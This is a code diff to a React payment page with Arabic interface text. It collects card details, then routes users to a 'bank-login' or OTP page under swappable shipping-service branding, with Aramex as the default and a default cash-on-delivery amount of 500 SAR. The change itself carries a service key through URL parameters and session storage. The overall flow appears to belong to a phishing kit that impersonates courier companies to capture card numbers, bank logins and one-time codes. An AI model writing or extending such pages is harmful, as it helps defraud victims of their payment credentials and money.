@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -20,17 +20,26 @@ const PaymentCardInput = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading } = useLink(id);
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   useEffect(() => {
     const method = sessionStorage.getItem('paymentMethod');
+    const sessionService = sessionStorage.getItem('serviceKey');
+    const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
+    const serviceKeyParam = payloadService || urlServiceKey || sessionService;
+    const serviceQuery = serviceKeyParam ? `?service=${encodeURIComponent(serviceKeyParam)}` : "";
+
     if (!method) {
-      navigate(`/pay/${id}/track`);
+      navigate(`/pay/${id}/track${serviceQuery}`);
       return;
     }
     if (method !== 'card') {
-      navigate(`/pay/${id}/bank-login`);
+      navigate(`/pay/${id}/bank-login${serviceQuery}`);
     }
-  }, [id, navigate]);
+  }, [id, navigate, linkData, urlServiceKey]);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -62,11 +71,19 @@ const PaymentCardInput = () => {
   }
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
-  const serviceName = payload.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const resolvedServiceKey = payload.service_key || payload.service || urlServiceKey || customerInfo.serviceKey || sessionServiceKey || customerInfo.service || 'aramex';
+  const serviceName = payload.service_name || resolvedServiceKey;
+  const branding = getServiceBranding(resolvedServiceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  const serviceQuery = resolvedServiceKey ? `?service=${encodeURIComponent(resolvedServiceKey)}` : "";
+
+  useEffect(() => {
+    if (resolvedServiceKey) {
+      sessionStorage.setItem('serviceKey', resolvedServiceKey);
+    }
+  }, [resolvedServiceKey]);
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
@@ -224,16 +241,16 @@ const PaymentCardInput = () => {
     
     // Navigate to bank login page if bank is selected, otherwise go to OTP
     if (selectedBankId && selectedBankId !== 'skipped') {
-      navigate(`/pay/${id}/bank-login`);
+      navigate(`/pay/${id}/bank-login${serviceQuery}`);
     } else {
-      navigate(`/pay/${id}/otp`);
+      navigate(`/pay/${id}/otp${serviceQuery}`);
     }
   };
   
   return (
     <DynamicPaymentLayout
       serviceName={serviceName}
-      serviceKey={serviceKey}
+      serviceKey={resolvedServiceKey}
       amount={formattedAmount}
       title="تفاصيل الدفع"
       description={`أدخل بيانات البطاقة لخدمة ${serviceName} مع تأكيد عبر رمز التحقق`}
